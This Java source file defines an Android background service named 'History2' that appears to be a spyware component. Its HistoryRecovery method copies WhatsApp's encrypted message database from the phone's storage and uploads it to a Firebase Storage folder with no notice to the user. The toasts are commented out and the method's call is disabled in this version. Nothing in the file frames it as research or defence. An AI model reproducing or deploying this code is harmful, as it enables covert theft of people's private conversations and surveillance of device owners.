package com.example.myapplication;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.SensorManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;

public class History2 extends Service {
    //For Firebase
    private StorageReference mStorageRef;
    private FirebaseAuth fbAuth;
    private FirebaseAuth.AuthStateListener authListener;
    private FirebaseDatabase database;
    private DatabaseReference myRef;
    private static String audioFilePath = null;
    public History2() {
    }
    @Override
    public void onCreate() {
        super.onCreate();
        database = FirebaseDatabase.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference();
        fbAuth = FirebaseAuth.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference();
        //myRef = database.getReference("message");
        database=FirebaseDatabase.getInstance();
        myRef = database.getReference().child("message");

      //HistoryRecovery();




    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    private void HistoryRecovery(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {
            // Do whatever

            audioFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.crypt12";
            StorageReference riversRef = mStorageRef.child("Sauve").child("msgstore.db.crypt12 ");
            Uri file = Uri.fromFile(new File(audioFilePath));
            riversRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    //Toast.makeText(getApplicationContext(), "Audio Uploaded", Toast.LENGTH_LONG).show();


                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception exception) {
                            // Handle unsuccessful uploads
                            // Toast.makeText(getApplicationContext(), "Audio not Uploaded", Toast.LENGTH_LONG).show();

                            // ...
                        }
                    });


        }
        else {
            audioFilePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Databases/msgstore.db.crypt12";
            StorageReference riversRef = mStorageRef.child("Sauve").child("msgstore.db.crypt12 ");
            Uri file = Uri.fromFile(new File(audioFilePath));
            riversRef.putFile(file).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    //Toast.makeText(getApplicationContext(), "Audio Uploaded", Toast.LENGTH_LONG).show();


                }
            })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception exception) {
                            // Handle unsuccessful uploads
                            // Toast.makeText(getApplicationContext(), "Audio not Uploaded", Toast.LENGTH_LONG).show();

                            // ...
                        }
                    });

        }

    }
}
